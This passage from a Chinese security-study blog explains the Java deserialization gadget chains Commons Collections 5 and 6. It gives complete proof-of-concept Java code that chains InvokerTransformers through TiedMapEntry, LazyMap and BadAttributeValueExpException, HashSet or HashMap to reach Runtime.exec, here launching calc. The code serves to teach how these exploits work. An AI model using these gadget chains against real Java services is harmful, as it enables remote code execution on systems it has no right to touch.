class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        setFieldValue(transformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(priorityQueue);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">        value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913132952410.png" class="" title="image-20220913132952410"><h2 id="Commons-Collections5"><a href="#Commons-Collections5" class="headerlink" title="Commons Collections5"></a>Commons Collections5</h2><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">/*<br>   Gadget chain:<br>        ObjectInputStream.readObject()<br>            BadAttributeValueExpException.readObject()<br>                TiedMapEntry.<span class="hljs-keyword">to</span><span class="hljs-built_in">String</span>()<br>                    LazyMap.<span class="hljs-keyword">get</span>()<br>                        ChainedTransformer.transform()<br>                            ConstantTransformer.transform()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    <span class="hljs-keyword">Class</span>.getMethod()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.getRun<span class="hljs-built_in">time</span>()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.exec()<br><br>   Requires:<br>      commons-collections<br> */<br></code></pre></td></tr></table></figure><p>通过Gadget可以发现cc5与cc1的不同在对LazyMap.get()的调用，cc5是TiedMapEntry.toString去看源码</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913141335749.png" class="" title="image-20220913141335749"><p>this.map</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913141431876.png" class="" title="image-20220913141431876"><p>可以看到toString对getValue调用了</p><p>寻找能调用toString的地方</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913152345194.png" class="" title="image-20220913152345194"><p>得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//恶意Transformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashmap</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashmap,chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;sss&quot;</span>);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//反射设置val值为TiedMapEntry实例</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(badAttributeValueExpException);<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        ois.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913152747159.png" class="" title="image-20220913152747159"><h2 id="Commons-Collections6"><a href="#Commons-Collections6" class="headerlink" title="Commons Collections6"></a>Commons Collections6</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/*<br>Gadget chain:<br>    java.io.ObjectInputStream.readObject()<br>            java.util.HashSet.readObject()<br>                java.util.HashMap.put()<br>                java.util.HashMap.hash()<br>                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>                        org.apache.commons.collections.<span class="hljs-keyword">map</span>.LazyMap.get()<br>                            org.apache.commons.collections.functors.ChainedTransformer<span class="hljs-built_in">.transform</span>()<br>                            org.apache.commons.collections.functors.InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>                            java<span class="hljs-built_in">.lang</span>.reflect.Method.invoke()<br>                                java<span class="hljs-built_in">.lang</span>.Runtime.exec()<br><br>    <span class="hljs-keyword">by</span> @matthias_kaiser<br>*/<br></code></pre></td></tr></table></figure><p>在分析cc5的时候，TiedMapEntry.toString()调用了getValue()然而我们发现这个类的hashCode也可以调，所以cc6是对其hashCode方法调用链的构造</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913153617328.png" class="" title="image-20220913153617328"><p>由URLDNS里面对hashMap的分析可知其hash方法调用了hashCode()我们去分析</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913160113568.png" class="" title="image-20220913160113568"><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913160330847.png" class="" title="image-20220913160330847"><p>那么下面需要做的，就是找到一个调用put方法的类这里给出的是HashSet的readObject</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913190933224.png" class="" title="image-20220913190933224"><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913191117094.png" class="" title="image-20220913191117094"><p>可以发现writeObject是根据key值写的，所以我们要为构造的hashmap提供一个key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc61</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">        value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] faketransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(faketransformers);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(inner,transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;sovo&quot;</span>);<br><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>        set.add(tiedMapEntry);<br>        lazymap.clear();<br><br>        setFieldValue(lazymap,<span class="hljs-string">&quot;factory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers));<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(set);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="p神版本"><a href="#p神版本" class="headerlink" title="p神版本"></a>p神版本</h3><p>通过hashmap的readobject直接调用hash方法，不需要在利用hashset</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">pcc6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//恶意Transformer</span><br>        Transformer[] faketransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(faketransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innermap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innermap,chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;sovo&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;sovo&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;sovo&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer,transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(hashMap);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
